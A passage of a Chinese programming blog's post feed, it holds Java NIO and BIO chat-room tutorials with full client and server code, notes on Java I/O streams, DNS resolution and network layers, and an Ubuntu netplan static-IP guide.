Channel对应的状态有：CONNECT：socketChannel已经与服务器建立连接的状态；ACCEPT：serverSocketChannel已经与客户端建立连接的状态；READ：可读状态；WRITE：可写状态 Channel在Selector上注册完成后，会返回一个SelectKey对象，其中有几个重要的方法：interestOps：查看注册的Channel绑定的状态；readyOps：查看哪些是可操作的状态；channel：返回channel对象；selector：返回selector对象；attachment：附加其他对象 调用Selector的select方法，返回它监听的事件的数量，可同时响应多个事件。不过它是阻塞式的调用，当监听的事件中没有可以用来响应请求的，则会被阻塞，直到有可用的channel能够响应该请求，才会返回 实战1. NIO模型分析 在服务器端创建一个Selector，将ServerSocketChannel注册到Selector上，被Selector监听的事件为Accept Client1请求与服务器建立连接，Selector接收到Accept事件，服务器端对其进行处理（handles），服务器与客户端连接成功 建立连接过程中，服务器通道（ServerSocketChannel）调用accept方法，获取到与客户端进行连接的通道（SocketChannel），也将其注册到Selector上，监听READ事件，这样，客户端向服务器发送消息，就能触发该READ事件进行响应，读取该消息。 Tips: 我们处理这个建立连接并接收从客户端传过来的消息，都是在一个线程内完成的。在bio中，则会为单个客户端单独开辟一个线程，用于处理消息，并且客户端在不发送消息的过程中，该线程一直是阻塞的。 同样，两个客户连接过来也是一个线程在起作用，将客户端2的SocketChannel注册到服务器的Selector，并监听READ事件，随时响应随时处理。即一个客户端有一个SocketChannel，两个客户端就有两个SocketChannel，这个就是我们使用nio编程模型来用一个selector对象在一个线程里边监听以及处理多个通道的io的操作 各个Channel是被配置为非阻塞式的（configureBlocking(false)），但是Selector本身调用的select()方法，它是阻塞式的，当监听在Selector上的事件都没有触发时，那么它就会被阻塞，直到有事件对其进行响应 2. 聊天室项目代码重点知识2.1 服务器端2.1.1 字段 2.1.2 主方法 2.1.3 处理方法 2.1.4 转发消息方法 2.1.5 接收消息方法 2.2 客户端2.2.1 字段 2.2.2 主方法 2.2.3 处理方法 2.2.4 接收方法 2.2.5 发送方法 3. 测试结果 服务器端显示信息正确 4. 完整代码4.1 服务器端123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163package server;import java.io.Closeable;import java.io.IOException;import java.net.InetSocketAddress;import java.nio.ByteBuffer;import java.nio.channels.*;import java.nio.charset.Charset;import java.nio.charset.StandardCharsets;import java.util.Set;public class ChatServer &#123; private static final int DEFAULT_PORT = 8888; private static final String QUIT = \"quit\"; private static final int BUFFER = 1024; private int port; private ServerSocketChannel serverSocketChannel; private Selector selector; private ByteBuffer rBuffer = ByteBuffer.allocate(BUFFER); private ByteBuffer wBuffer = ByteBuffer.allocate(BUFFER); private Charset charset = Charset.forName(String.valueOf(StandardCharsets.UTF_8)); public ChatServer()&#123; this(DEFAULT_PORT); &#125; public ChatServer(int port) &#123; this.port = port; &#125; public boolean readyToQuit(String msg)&#123; return QUIT.equals(msg); &#125; public void close(Closeable closeable)&#123; if(closeable != null) &#123; try &#123; closeable.close(); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; &#125; &#125; public void start()&#123; try &#123; //创建ServerSocketChannel通道 serverSocketChannel = ServerSocketChannel.open(); //设置非阻塞模式，默认情况也是阻塞调用的 serverSocketChannel.configureBlocking(false); //绑定端口号 serverSocketChannel.bind(new InetSocketAddress(port)); //创建selector selector = Selector.open(); //将accept事件注册到selector上 serverSocketChannel.register(selector, SelectionKey.OP_ACCEPT); System.out.println(\"服务器启动成功，监听端口号：\" + port + \"...\"); //开始进入监听模式 while(true)&#123; //阻塞式调用 selector.select(); //获取所有的监听事件， Set&lt;SelectionKey&gt; selectionKeys = selector.selectedKeys(); for (SelectionKey selectionKey : selectionKeys) &#123; //处理事件 handles(selectionKey); &#125; //将已经处理完成的事件进行清空 selectionKeys.clear(); &#125; &#125; catch (IOException e) &#123; e.printStackTrace(); &#125;finally &#123; close(selector); &#125; &#125; /** * 处理事件 处理accept事件 和 read事件 * @param selectionKey 与selector绑定的channel的key */ private void handles(SelectionKey selectionKey) throws IOException &#123; if(selectionKey.isAcceptable())&#123; //处理accept事件 //先要获取ServerSocketChannel ServerSocketChannel server =(ServerSocketChannel) selectionKey.channel(); // 我觉得这样写也行 直接调用全局变量 SocketChannel socketChannel = serverSocketChannel.accept(); //获取对应的客户端的通道 SocketChannel socketChannel = server.accept(); socketChannel.configureBlocking(false); //将客户端通道绑定到selector上，监听read事件 socketChannel.register(selector,SelectionKey.OP_READ); System.out.println(\"客户端\" + socketChannel.socket().getPort() + \":已经连接\"); &#125;else if(selectionKey.isReadable())&#123; //处理read事件 SocketChannel clientChannel = (SocketChannel) selectionKey.channel(); String fwdMsg = receive(clientChannel); if(fwdMsg.isEmpty())&#123; //接不到消息了，那么就把这个通道给他移除了 selectionKey.cancel(); //通知selector有注册的通道被移除了，更新状态 selector.wakeup(); &#125;else &#123; //转发消息 forwardMessage(clientChannel,fwdMsg); if(readyToQuit(fwdMsg))&#123; selectionKey.cancel(); selector.wakeup(); &#125; &#125; &#125; &#125; /** * 转发消息 * @param clientChannel 客户端通道 * @param fwdMsg 转发的消息 */ private void forwardMessage(SocketChannel clientChannel, String fwdMsg) throws IOException &#123; //keys方法区别于selectedKeys,这个方法返回的是接下来需要被处理的通道key //而keys则返回与selector绑定的所有通道key //跳过ServerSocketChannel和本身 for (SelectionKey selectionKey : selector.keys()) &#123; SelectableChannel channel = selectionKey.channel(); if(channel instanceof ServerSocketChannel) System.out.println(\"客户端\" + clientChannel.socket().getPort() + \"：\" + fwdMsg); else if(selectionKey.isValid() &amp;&amp; !channel.equals(clientChannel))&#123; wBuffer.clear(); //写入消息 wBuffer.put(charset.encode(\"客户端\" + clientChannel.socket().getPort() + \"：\" + fwdMsg)); //转换为读模式 wBuffer.flip(); //有数据就一直读 while(wBuffer.hasRemaining()) ((SocketChannel)channel).write(wBuffer); &#125; &#125; &#125; /** * 从客户通道上读取消息 * @param clientChannel 客户通道 * @return 消息 */ private String receive(SocketChannel clientChannel) throws IOException &#123; //将当前指针置于初始位置，覆盖已有的消息（清空消息） rBuffer.clear(); //不停的向缓存中写 while(clientChannel.read(rBuffer) &gt; 0); //由写模式到读模式 rBuffer.flip(); return String.valueOf(charset.decode(rBuffer)); &#125; public static void main(String[] args) &#123; ChatServer chatServer = new ChatServer(); chatServer.start(); &#125;&#125; 4.2 客户端123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132package client;import java.io.Closeable;import java.io.IOException;import java.net.InetSocketAddress;import java.nio.ByteBuffer;import java.nio.channels.*;import java.nio.charset.Charset;import java.nio.charset.StandardCharsets;import java.util.Set;public class ChatClient &#123; private static final String DEFAULT_SERVER_HOST = \"127.0.0.1\"; private static final int DEFAULT_SERVER_PORT = 8888; private static final String QUIT = \"quit\"; private static final int BUFFER = 1024; private String host; private int port; private SocketChannel clientChannel; private Selector selector; private ByteBuffer rBuffer = ByteBuffer.allocate(BUFFER); private ByteBuffer wBuffer = ByteBuffer.allocate(BUFFER); private Charset charset = Charset.forName(String.valueOf(StandardCharsets.UTF_8)); public ChatClient(String host, int port) &#123; this.host = host; this.port = port; &#125; public ChatClient() &#123; this(DEFAULT_SERVER_HOST,DEFAULT_SERVER_PORT); &#125; public boolean readyToQuit(String msg)&#123; return QUIT.equals(msg); &#125; public void close(Closeable closeable)&#123; if(closeable != null)&#123; try &#123; closeable.close(); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; &#125; &#125; public void start()&#123; try &#123; //创建用户通道 clientChannel = SocketChannel.open(); clientChannel.configureBlocking(false);//这一步千万不能忘了 //创建selector，并且将用户通道的connect请求注册上去 selector = Selector.open(); clientChannel.register(selector, SelectionKey.OP_CONNECT); //尝试与服务器创建连接 clientChannel.connect(new InetSocketAddress(host,port)); while (selector.isOpen())&#123; //一直监听selector上注册的channel请求 selector.select(); Set&lt;SelectionKey&gt; selectionKeys = selector.selectedKeys(); for (SelectionKey selectionKey : selectionKeys) &#123; //响应请求 handles(selectionKey); &#125; selectionKeys.clear(); &#125; &#125; catch (IOException e) &#123; e.printStackTrace(); &#125;catch (ClosedSelectorException e)&#123; &#125; finally &#123; close(selector); &#125; &#125; private void handles(SelectionKey selectionKey) throws IOException &#123; //处理connect事件 if(selectionKey.isConnectable())&#123; //如果能够与服务器响应了 SocketChannel channel = (SocketChannel) selectionKey.channel(); if(channel.isConnectionPending())&#123; channel.finishConnect(); //正式建立连接 new Thread(new UserInputHandler(this)).start(); &#125; channel.register(selector,SelectionKey.OP_READ); &#125;else if(selectionKey.isReadable())&#123; String msg = receive(clientChannel); SocketChannel channel = (SocketChannel) selectionKey.channel(); if(msg.isEmpty())&#123; //服务端异常 close(selector); &#125;else &#123; //TODO 看看这里信息对不对 System.out.println(msg); &#125; &#125; &#125; private String receive(SocketChannel clientChannel) throws IOException &#123; rBuffer.clear(); //一直读数据 while (clientChannel.read(rBuffer) &gt; 0); rBuffer.flip(); return String.valueOf(charset.decode(rBuffer)); &#125; public void send(String msg) throws IOException &#123; if(msg.isEmpty()) return; wBuffer.clear(); wBuffer.put(charset.encode(msg)); wBuffer.flip(); while(wBuffer.hasRemaining())&#123; clientChannel.write(wBuffer); &#125; if(QUIT.equals(msg)) close(selector); &#125; public static void main(String[] args) &#123; ChatClient chatClient = new ChatClient(); chatClient.start(); &#125;&#125; 4.3 客户端监听用户输入进程123456789101112131415161718192021222324252627282930package client;import java.io.BufferedReader;import java.io.IOException;import java.io.InputStreamReader;public class UserInputHandler implements Runnable&#123; private ChatClient chatClient; public UserInputHandler(ChatClient chatClient) &#123; this.chatClient = chatClient; &#125; @Override public void run() &#123; //等待用户输入信息 BufferedReader consoleReader = new BufferedReader(new InputStreamReader(System.in)); while(true)&#123; try &#123; String msg = consoleReader.readLine(); chatClient.send(msg); if(chatClient.readyToQuit(msg)) break; &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; &#125; &#125;&#125;","categories":[],"tags":[{"name":"network","slug":"network","permalink":"https://kayleh.top/tags/network/"}]},{"title":"BIO blocking model","slug":"BIO阻塞模型","date":"2020-12-03T09:46:43.000Z","updated":"2021-04-11T17:11:28.103Z","comments":true,"path":"BIO-blocking-model/","link":"","permalink":"https://kayleh.top/BIO-blocking-model/","excerpt":"","text":"BIO阻塞模型1. BIO阻塞模型简述BIO模型中服务端与客户端的响应过程 服务器serverSocket先要和端口进行绑定 绑定完成后，执行accept方法，等待客户端的连接，这个方法是阻塞式调用，也就是说，要一直等待客户端的连接响应，不做其他事情，一直等，（被阻塞的还有InputStream.read()、OutputStream.write()，这两个也会一直等待客户端的响应） 客户端创建Socket对象，绑定服务器的ip地址与端口号，与服务器进行连接 服务器接收到客户端的连接请求，accept方法获取到客户端的socket信息，连接成功 服务器与客户端创建各自的io流，实现全双工通信 之后便可以随时结束连接 2. 简单实战演示2.1 服务器12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758import java.io.*;import java.net.ServerSocket;import java.net.Socket;public class Server &#123; public static void main(String[] args) &#123; final int DEFAULT_PORT = 8888; final String QUIT = \"quit\"; ServerSocket serverSocket = null; try &#123; //绑定端口号 serverSocket = new ServerSocket(DEFAULT_PORT); System.out.println(\"服务器已经启动，绑定端口号：\" + DEFAULT_PORT); while (true)&#123; //等待客户端的连接 Socket socket = serverSocket.accept(); System.out.println(\"客户端\" + socket.getPort() + \":\" + \"已经连接\"); //获取io流 BufferedReader reader = new BufferedReader( new InputStreamReader(socket.getInputStream()) ); BufferedWriter writer = new BufferedWriter( new OutputStreamWriter(socket.getOutputStream()) ); //读取客户发送的信息 String msg = null; while ((msg = reader.readLine()) != null) &#123; System.out.println(\"客户端\" + socket.getPort() + \":\" + msg); //回复消息 writer.write( msg + \" ok\" +\"\\n\"); writer.flush(); System.out.println(\"服务器：\" + msg + \" ok\"); if(msg.equals(QUIT))&#123; System.out.println(\"客户端\" + socket.getPort() + \":断开连接\" ); break; &#125; &#125; &#125; &#125; catch (IOException e) &#123; e.printStackTrace(); &#125;finally &#123; if(serverSocket != null)&#123; try &#123; serverSocket.close(); System.out.println(\"服务器Socket关闭\"); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; &#125; &#125; &#125;&#125; 2.2 客户端12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758import java.io.*;import java.net.Socket;import java.net.UnknownHostException;public class Client &#123; public static void main(String[] args) &#123; final int DEFAULT_SERVER_PORT = 8888; final String DEFAULT_ADDRESS = \"127.0.0.1\"; final String QUIT = \"quit\"; Socket socket = null; BufferedWriter writer = null; try &#123; //创建Socket socket = new Socket(DEFAULT_ADDRESS,DEFAULT_SERVER_PORT); //创建io流 writer = new BufferedWriter( new OutputStreamWriter(socket.getOutputStream()) ); BufferedReader reader = new BufferedReader( new InputStreamReader(socket.getInputStream()) ); //等待用户输入信息 while (true) &#123; BufferedReader consoleReader = new BufferedReader(new InputStreamReader(System.in)); String msg = consoleReader.readLine(); //向服务器发送消息 writer.write(msg + \"\\n\"); writer.flush(); System.out.println(\"客户端\"+ \":\" + msg); String line = reader.readLine(); System.out.println(\"服务器：\" + line); //退出判断 if(msg.equals(QUIT))&#123; break; &#125; &#125; &#125; catch (UnknownHostException e) &#123; e.printStackTrace(); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125;finally &#123; if(writer != null)&#123; try &#123; writer.close(); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; &#125; &#125; &#125;&#125; 2.3 响应结果 客户端 服务器 3. 加深理解 实战1. 概念图解 BIO模型：客户端每有一个请求，服务端都要有一个线程来单独处理这个请求，典型的一请求一应答，java 1.4版本之前 对于聊天室服务器，它有多个线程，其中一个为图上的Acceptor线程（ChatServer），它实现的就是对来自客户端的请求不断响应，创建分配处理线程；对应客户端的每一个请求，都有一个单独的处理线程 对于客户端来说，它有两个线程，其中一个线程与服务器建立连接，并接收来自服务器的消息；另一个线程则用来处理用户的输入，并将消息发送到服务器 1.1 伪异步的优化 使用线程池的原因是因为防止一大批用户的响应，造成服务器过载，实现线程的复用，减少不停的创建删除线程造成的资源郎芬，这样也实现了BIO的伪异步IO通信 I/O模型系列之三：IO通信模型BIO NIO AIO 2. 聊天服务器中的要点2.1 字段 2.2 转发消息方法 2.3 添加客户方法 2.4 移除客户方法 2.5 服务器主线程任务 2.6 服务器处理线程任务 实现Runnable接口，之后执行的时候将其传入到线程池中执行。 3. 聊天室客户端要点3.1 向服务端发送消息，让服务器转发给其他人 3.2 接收服务端的消息 3.3 主线程任务 3.4 处理线程任务 实现Runnable接口，创建线程时启动 4. 测试结果服务器端信息 5. 完整代码5.1 服务器123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105package Server;import java.io.BufferedWriter;import java.io.IOException;import java.io.OutputStreamWriter;import java.io.Writer;import java.net.ServerSocket;import java.net.Socket;import java.util.HashMap;import java.util.Map;import java.util.concurrent.ExecutorService;import java.util.concurrent.Executors;public class ChatServer &#123; private int DEFAULT_PORT = 8888; private final String QUIT = \"quit\"; private ServerSocket serverSocket; //存储已经连接的客户们 private Map&lt;Integer, Writer&gt; connectedClients; private ExecutorService executorService; public ChatServer() &#123; this.connectedClients = new HashMap&lt;&gt;(); this.executorService = Executors.newFixedThreadPool(10); &#125; //添加客户端 public synchronized void addClient(Socket socket) throws IOException &#123; if(socket != null)&#123; int key = socket.getPort(); Writer value = new BufferedWriter( new OutputStreamWriter(socket.getOutputStream()) ); connectedClients.put(key,value); System.out.println(\"客户\" + key + \"：已经连接\"); &#125; &#125; //移除客户端 public synchronized void removeClient(Socket socket) throws IOException &#123; if(socket != null)&#123; int port = socket.getPort(); if(connectedClients.containsKey(port))&#123; //移除用户的时候要进行关闭 connectedClients.get(port).close(); connectedClients.remove(port); System.out.println(\"客户端\" + port + \"：已经断开连接\"); &#125; &#125; &#125; //将消息转发给其他用户 public synchronized void forwardMessage(Socket socket,String fwdMsg) throws IOException &#123; for(Integer port : connectedClients.keySet())&#123; //不转发给自己 if(!port.equals(socket.getPort()))&#123; Writer writer = connectedClients.get(port); writer.write(fwdMsg); writer.flush(); &#125; &#125; &#125; //检查是否退出 public boolean readyToQuit(String msg)&#123; return QUIT.equals(msg); &#125; public void close()&#123; if(serverSocket != null)&#123; try &#123; serverSocket.close(); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; &#125; &#125; //启动 public void start()&#123; try &#123; //绑定监听端口 serverSocket = new ServerSocket(DEFAULT_PORT); System.out.println(\"聊天室服务器已经成功启动！\"); while (true)&#123; Socket socket = serverSocket.accept(); //为每个socket创建一条单独的线程进行处理 //new Thread(new ChatHandler(socket,this)).start(); executorService.execute(new ChatHandler(socket,this)); &#125; &#125; catch (IOException e) &#123; e.printStackTrace(); &#125;finally &#123; close(); &#125; &#125; public static void main(String[] args) &#123; ChatServer chatServer = new ChatServer(); chatServer.start(); &#125;&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051package Server;import java.io.BufferedReader;import java.io.IOException;import java.io.InputStreamReader;import java.net.Socket;public class ChatHandler implements Runnable &#123; private Socket socket; private ChatServer chatServer; public ChatHandler(Socket socket, ChatServer chatServer) &#123; this.socket = socket; this.chatServer = chatServer; &#125; @Override public void run() &#123; try &#123; //添加对象 chatServer.addClient(socket); //读取用户发送的信息 BufferedReader reader = new BufferedReader( new InputStreamReader(socket.getInputStream()) ); String msg = null; //必须要读取到换行符 while ((msg = reader.readLine()) != null)&#123; String fwdMsg =\"客户端\" + socket.getPort() + \"：\" + msg + \"\\n\"; chatServer.forwardMessage(socket,fwdMsg); System.out.print(fwdMsg); //检查是否退出 if(chatServer.readyToQuit(msg))&#123; break; &#125; &#125; &#125; catch (IOException e) &#123; e.printStackTrace(); &#125;finally &#123; try &#123; chatServer.removeClient(socket); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; &#125; &#125;&#125; 5.2 客户端123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384package Client;import Server.ChatServer;import java.io.*;import java.net.Socket;import java.net.UnknownHostException;public class ChatClient &#123; private String DEFAULT_SERVER_HOST = \"127.0.0.1\"; private int DEFAULT_PORT = 8888; private final String QUIT = \"quit\"; private Socket socket; private BufferedReader reader; private BufferedWriter writer; //发送消息给服务器 public void sendMsg(String msg) throws IOException &#123; //输出流没有关闭的情况 if(!socket.isOutputShutdown())&#123; writer.write(msg + \"\\n\"); writer.flush(); &#125; &#125; //接受消息从服务器 public String receiveMsg() throws IOException &#123; if(!socket.isInputShutdown())&#123; return reader.readLine(); &#125; return null; &#125; //检查是否退出 public boolean readyToQuit(String msg)&#123; return QUIT.equals(msg); &#125; //关闭 public void close()&#123; try &#123; writer.close(); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; &#125; //启动开关 public void start()&#123; try &#123; //创建socket socket = new Socket(DEFAULT_SERVER_HOST,DEFAULT_PORT); //创建io流 writer = new BufferedWriter( new OutputStreamWriter(socket.getOutputStream()) ); reader = new BufferedReader( new InputStreamReader(socket.getInputStream()) ); //处理用户的输入的线程 new Thread(new UserInputHandler(this)).start(); //监听从服务器来的消息 String msg = null; while ((msg = receiveMsg()) != null)&#123; System.out.println(msg); &#125; &#125; catch (UnknownHostException e) &#123; e.printStackTrace(); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125;finally &#123; close(); &#125; &#125; public static void main(String[] args) &#123; ChatClient chatClient = new ChatClient(); chatClient.start(); &#125;&#125; 12345678910111213141516171819202122232425262728293031323334package Client;import java.io.BufferedReader;import java.io.IOException;import java.io.InputStreamReader;public class UserInputHandler implements Runnable&#123; private ChatClient chatClient; public UserInputHandler(ChatClient chatClient) &#123; this.chatClient = chatClient; &#125; @Override public void run() &#123; //等待用户输入信息 BufferedReader reader = new BufferedReader( new InputStreamReader(System.in) ); while (true)&#123; try &#123; String msg = reader.readLine(); //向服务器发送消息 chatClient.sendMsg(msg); if(chatClient.readyToQuit(msg)) break; &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; &#125; &#125;&#125;","categories":[],"tags":[{"name":"network","slug":"network","permalink":"https://kayleh.top/tags/network/"}]},{"title":"I/O model","slug":"I-O模型","date":"2020-12-03T09:44:24.000Z","updated":"2021-04-11T17:11:28.157Z","comments":true,"path":"IO-model/","link":"","permalink":"https://kayleh.top/IO-model/","excerpt":"","text":"I/O模型1. java.io下的字符流和字节流 1.1 字符流字符流更加的方便我们使用，一般字符都是由多个字节来形成的，若我们使用字节流传输，则还需要我们自己将其转换为字符，若我们直接使用字符流的话，这样就能直接读取与输出字符。 CharArrayReader：是基础的字符输入流，能从字符数组中读取数据 StringReader：从字符串输入流中读取数据 输出流同理 1.1.1 更高级的字符流 BufferedReader：附带缓存区的字符输入流，但是我们并不能直接实例化供我们使用，而是将我们已经创建的Reader字符流，传入进来，就像对它升级一样，多了更多的功能，比如该字符流就是提供了缓存区，这样加快了io的效率，不必重复读取原始数据源 FilterReader：同样也是运用了装饰模式，它额外的功能能对字符流中的字符进行筛选等 InputStreamReader：连接字节流与字符流的一个桥梁，将字节流转化为字符流，比较常用的就是FileReader 1.2 字节流字节流则是对一个个字节进行读取 ByteArrayInputStream：字节数组输入流，从字节数组中获取数据 FileInputStream：文件输入流，从文件中获取数据 输出流同理 1.2.1 更高级的字节流 BufferedInputStream：附带缓存区的字节输入流，它同样也是与BufferedReader一个原理，也需要传入进本的InputStream进行升级 DataInputStream与DataOutputStream：这俩就比较有意思了，相辅相成，与java内置的基本数据类型相关，能够将其中的字节，利用一些方法，比如toLong或toInt等方法直接转换为java的基本数据类型 2. 装饰器模式我们刚刚看到的，在字符流中BufferedReader、InputStreamReader和FilterReader，字节流中的BufferedInputStream、DataInputStreamReader与DataOutputStream都运用到了装饰器模式，因为它们本身不能进行实例化，都需要传入基本的Reader或InputStream来进行升级，这里便体现的是装饰器模式。 3. Socket 我们可以将Socket认为是网络传输的端点，它也是一种数据源，将特定的ip地址与端口号与其进行绑定，这样它就能够实现通信的功能，如下图中，服务器中的socket绑定了对应的ip与端口号，与客户端间进行通信 3.1 通过Socket发送数据 创建Socket，绑定特定的ip地址与端口号 将Socket与网卡驱动程序绑定 通过Socket我们就能够发送数据了 网卡驱动程序对Socket数据进行读取 3.2 通过Socket读取数据 与发送数据类似，只不过是将这个过程反过来了 我们还是要先创建Socket 将Socket与网卡驱动程序进行绑定 Socket接收来自网卡驱动程序的数据 从Socket中读取数据 4. 同步异步与阻塞非阻塞的概念它们有两两组合的四种不同的排列组合，同步与异步强调通信机制，通俗点儿说可以是关于反应者的概念；阻塞与非阻塞强调调用状态，我们可以将其理解为调用者或者请求发起者 4.1 同步（女孩）男孩向女孩表白，女孩立即对该事件进行思考、反应，这就是同步通信机制 4.2 异步（女孩）异步通信机制就是，女孩不会对男孩的请求立即响应，而是女孩先去考虑考虑，有结果了呢，我发短信给你 4.3 阻塞（男孩）男孩是个瓜皮，自动对女孩表白了以后，茶不思饭不想，一直等待着女孩的回应，不做其他的事情 4.4 非阻塞（男孩）这种男生就比较厉害了，能够协调好生活和爱情，和女孩表白后，不对结果困惑，而是该干啥还去干啥，这就是非阻塞调用 4.5 四种排列组合 同步阻塞男孩表白后，女孩立即进行思考给出反应，男孩在该过程中傻等，不干别的 异步阻塞男孩表白后，女孩溜了，回家去想怎么回应了，不立即思考，男孩傻等，不干别的 同步非阻塞男孩表白后，男孩干别的去了，不等你回复，而女孩立即陷入了沉思，想着反应结果 异步非阻塞两个人都比较想得开，男孩表白完，干别的去了，女孩也不立即考虑这件事情，等啥时候考虑好了，再发消息给男孩 同步阻塞、同步非阻塞、异步阻塞、异步非阻塞 5. 网络通信中的线程池我们在处理高并发请求的时候，若采用如下方法，将会造成很大的资源浪费 线程池的使用是为了避免这种情况，节省系统的资源 5.1 java提供的线程池我们可以利用Runnable与Callable来创建任务，利用线程池中的线程去执行任务，最后获得结果 5.2 java创建线程池的静态方法 newSingleThreadExecutor：这个线程池中只有一个线程，我们对这一个线程进行不断的复用 newFixedThreadPool：固定线程数量的线程池，当超过线程容量的时候，要进行等待 newCachedThreadPool：这个线程池对多出的任务，还会创建出新的线程去对其进行执行 newScheduledThreadPool：能够实现定时处理任务的线程池","categories":[],"tags":[{"name":"network","slug":"network","permalink":"https://kayleh.top/tags/network/"}]},{"title":"Java network programming","slug":"Java网络编程","date":"2020-12-03T09:35:35.000Z","updated":"2021-04-11T17:11:28.234Z","comments":true,"path":"Java-network-programming/","link":"","permalink":"https://kayleh.top/Java-network-programming/","excerpt":"","text":"@来源CSDN：方圆1. URL地址的构造和解析我们看如上地址，一般情况下.root根域名的部分会被省略。而URL的解析过程就是从右向左进行解析，将地址转换为IP地址，进行访问。 1.1 域名的层级 1.2 域名DNS查询的两种方式1.2.1 递归查询 如图上所示，浏览器将请求发送给DNS客户端，客户端请求根域名服务器对域名进行解析，解析完成后，随后再访问顶级域名服务器，请求它对域名进行解析，以此类推，直至全部解析完毕，重新从三级域名服务器一层一层传递给DNS客户端，再发送给浏览器。 1.2.2 迭代查询 迭代查询是访问DNS客户端后，先访问根域名服务器，将根域名服务器中存储的该域名的内容全部发送给DNS客户端，如果无法实现域名解析的话，DNS客户端会再次请求顶级域名服务器，过程也同上，最终完成解析后，再将请求结果传递给浏览器。 Tip: 在对域名进行解析过一次后，就会产生它的缓存，存在DNS客户端中，当再次访问该域名时，就不会再去请求各个域名服务器了。对于根域名服务器，在全球是限量的，它已经被内置在DNS客户端中了，不必担心不知道根域名服务器地址的问题。 2. 网络协议的基础知识2.1 分层及协议 应用层：规定应用程序的数据格式 传输层：端口之间的连接 网络层：主机之间的连接，能够实现具体的定位 链路层：网卡之间的连接，每个网卡都有自己的MAC地址，在网卡生产出来的时候就已经确定了；假如通过MAC地址传递数据，那么它会给所有子网络主机都发送一份数据，并在接收时将MAC地址进行核对，一致时才进行接受，不能实现准确的定位 实体层：解决的是计算机之间的连接，一般通过光缆进行连接 2.2 各层的数据包格式从应用层向下，每经过一层都会被添加上该层的标头，对于Ethernet标头，它的大小为18个字节，其余数据部分为1500字节，它的大小最大为1518字节，即每个帧的字节，当发送较大的文件时，就会发送多个帧的数据包，通过标头信息，在接收时能够将其组合，实现数据的正确发送。","categories":[],"tags":[{"name":"network","slug":"network","permalink":"https://kayleh.top/tags/network/"}]},{"title":"ubuntu fixed IP setting method","slug":"ubuntu固定IP设置方法","date":"2020-11-13T07:23:35.000Z","updated":"2021-04-11T17:11:28.533Z","comments":true,"path":"ubuntu-set-ip/","link":"","permalink":"https://kayleh.top/ubuntu-set-ip/","excerpt":"","text":"ubuntu固定IP设置方法确认你要修改的网卡号先确认你要修改的网卡号，假设你的服务器有多张网卡： 1&#96;ubuntu1804:~$ ip addr&#96; 我的服务器配置如下： 1&#96;1: lo: mtu 65536 qdisc noqueue state UNKNOWN &#96;&#96;group&#96; &#96;default&#96; &#96;qlen 1000&#96;&#96;link&#x2F;loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00&#96;&#96;inet 127.0.0.1&#x2F;8 scope host lo&#96;&#96;valid_lft forever preferred_lft forever&#96;&#96;inet6 ::1&#x2F;128 scope host&#96;&#96;valid_lft forever preferred_lft forever&#96;&#96;2: ens33: mtu 1500 qdisc fq_codel state UP &#96;&#96;group&#96; &#96;default&#96; &#96;qlen 1000&#96;&#96;link&#x2F;ether 00:0c:29:f1:b5:e1 brd ff:ff:ff:ff:ff:ff&#96;&#96;inet 172.16.87.140&#x2F;24 brd 172.16.87.255 scope global dynamic ens33&#96;&#96;valid_lft 1500sec preferred_lft 1500sec&#96;&#96;inet6 fe80::20c:29ff:fef1:b5e1&#x2F;64 scope link&#96;&#96;valid_lft forever preferred_lft forever&#96; 3. 默认的网卡配置文件默认情况下，网络使用DHCP 1&#96;ubuntu1804:~$ cat &#x2F;etc&#x2F;netplan&#x2F;50-cloud-init.yaml&#96;&#96;配置文件内容如下&#96; &#96;network:&#96;&#96; &#96;&#96;ethernets:&#96;&#96; &#96;&#96;ens33:&#96;&#96; &#96;&#96;dhcp4: yes&#96;&#96; &#96;&#96;addresses: []&#96; &#96; &#96;&#96;version: 2&#96; 4. 设置静态IP需要把配置文件修改为以下内容： 1&#96;ubuntu1804:~$ sudo vi &#x2F;etc&#x2F;netplan&#x2F;50-cloud-init.yaml&#96; 假设IP地址修改为192.168.1.100，子网掩码24位即255.255.255.0，网关设置为192.168.1.1，DNS1：223.5.5.5，DNS2：223.6.6.6 1&#96;network:&#96;&#96; &#96;&#96;ethernets:&#96;&#96; &#96;&#96;ens33:&#96;&#96; &#96;&#96;dhcp4: no&#96;&#96; &#96;&#96;addresses: [192.168.1.100&#x2F;24]&#96;&#96; &#96;&#96;optional: &#96;&#96;true&#96;&#96; &#96;&#96;gateway4: 192.168.1.1&#96;&#96; &#96;&#96;nameservers:&#96;&#96; &#96;&#96;addresses: [223.5.5.5,223.6.6.6]&#96; &#96; &#96;&#96;version: 2&#96; 5. 应用新配置1&#96;ubuntu1804:~$ sudo netplan apply&#96; 使用ip addr检查新地址 1&#96;ubuntu1804:~$ ip addr&#96; 6. 测试网络连通性1ubuntu1804:~$ ping 192.168.1.100","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"https://kayleh.top/tags/linux/"}]},{"title":"Java高性能高并发秒杀系统(10)","slug":"Java高性能高并发秒杀系统 - 副本 